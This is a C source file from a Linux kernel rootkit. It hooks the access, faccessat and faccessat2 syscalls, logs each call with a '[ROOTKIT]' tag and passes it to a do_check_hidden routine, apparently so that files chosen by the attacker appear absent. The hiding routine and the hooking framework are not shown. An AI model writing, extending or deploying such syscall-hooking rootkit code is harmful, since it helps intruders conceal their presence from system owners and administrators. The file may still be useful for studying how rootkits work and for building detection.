#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_access syscall hook handler
SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
{
    pr_info("[ROOTKIT] access(%p, 0%o)\n", s_filename, i32_mode);

    return do_check_hidden(orig_access, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_faccessat syscall hook handler
SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode)
{
    pr_info("[ROOTKIT] faccessat(%d, %p, 0%o)\n", i32_dfd, s_filename, i32_mode);

    return do_check_hidden(orig_faccessat, p_regs, i32_dfd, s_filename, 0);
}

// sys_faccessat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode, int, i32_flags)
{
    pr_info("[ROOTKIT] faccessat2(%d, %p, 0%o, %#x)\n", i32_dfd, s_filename, i32_mode, i32_flags);

    return do_check_hidden(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_flags);
}
